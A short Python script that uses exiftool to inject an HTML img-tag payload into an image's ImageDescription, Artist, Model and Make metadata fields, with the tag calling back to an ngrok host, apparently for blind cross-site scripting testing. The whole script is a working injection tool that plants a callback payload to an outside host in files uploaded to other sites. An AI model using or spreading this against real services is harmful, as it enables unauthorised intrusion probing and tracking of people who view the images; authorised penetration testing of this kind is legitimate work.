import sys
import subprocess
 
exifs = [
    "ImageDescription",
    "Artist",
    "Model",
    "Make",
    #"Software"
   #"Copyright"
]
 
if sys.argv[1]:
    image = sys.argv[1]
    xss = '<img src="//7b31935bb2b6.ngrok.io/{0}"></script>'
 
    for exif in exifs:
        attribute = "-{0}={1}".format(exif, xss.format(exif))
        subprocess.call(["exiftool", attribute, image])
 
    subprocess.call(["exiftool", image])
else:
    print("No source image given")
